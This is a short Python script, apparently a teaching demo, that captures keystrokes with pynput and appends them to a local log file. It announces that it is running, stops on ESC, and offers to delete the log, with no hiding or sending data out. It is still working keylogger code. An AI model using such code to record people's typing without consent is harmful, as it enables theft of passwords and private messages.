from pynput.keyboard import Listener, Key
import os
import time

LOG_FILE = "log.txt"
listener = None  #Will hold the Listener object

#Educational purpose notice:
print("This keylogger is for educational use only. Do not use it without permission.")

#Function to log keystrokes:
def log_keystroke(key):
    try:
        #Stop logging if ESC is pressed
        if key == Key.esc:
            print("\n[+] ESC pressed. Stopping logger.")
            return False  #Stops the listener
        
        #Checking for special keys
        if isinstance(key, Key):
            if key == Key.space:
                key_to_write = " " #Space
            elif key == key.enter:
                key_to_write = "\n" #New Line
            elif key == key.tab:
                key_to_write = "\t" #Tab
            else:
                return  #Skip other special keys (shift, ctrl, etc.)
        else:
            #Regular character keys
            key_to_write = key.char  #Safely get the character (e.g. 'a', '1')

        #Save keystroke to log file:
        with open("log.txt", "a") as log_file:
            log_file.write(key_to_write)
            
    except Exception as e:
        print(f"[!] Error logging keystroke: {e}")

#Function to start listening to keystrokes:
def start_logging():
    global listener
    try:
        listener = Listener(on_press=log_keystroke)
        listener.start()  #Start in background
        print("[+] Safe Keylogger is running... (Press ESC or CTRL + C to stop)")
        while listener.running:  #Run until listener is stopped
            time.sleep(0.1)  #Prevents high CPU usage
    except KeyboardInterrupt:
        print("\n[!] Logging stopped by CTRL + C.")
        if listener:
            listener.stop()
    except Exception as e:
        print(f"[!] Error starting listener: {e}")
        
#Optional: Function to clean up the log file:
def cleanup_log_file():
    if os.path.exists(LOG_FILE):
        try:
            os.remove(LOG_FILE)
            print("[*] Log file deleted for safety.")
        except Exception as e:
            print(f"[!] Failed to delete log file: {e}")
    else:
        print("[*] No log file to delete.")


#Main function to run logger:
if __name__ == "__main__":
    print("[+] Safe Keylogger is running... (Press CTRL + C to stop)")
    start_logging()
    
    #Optional cleanup step after logging ends
    try:
        user_choice = input("Do you want to delete the log file? (y/n): ").strip().lower()
        if user_choice == "y":
            cleanup_log_file()
        else:
            print("[*] Log file was kept.")
    except Exception as e:
        print(f"[!] Error during cleanup prompt: {e}")
        
#Running the script will have it listen to your keystrokes.
#To stop it, press either ESC or CTRL + C.
#After it stops, it will ask if you want to delete the log file.
#Choose y to clean up or n to keep the file.
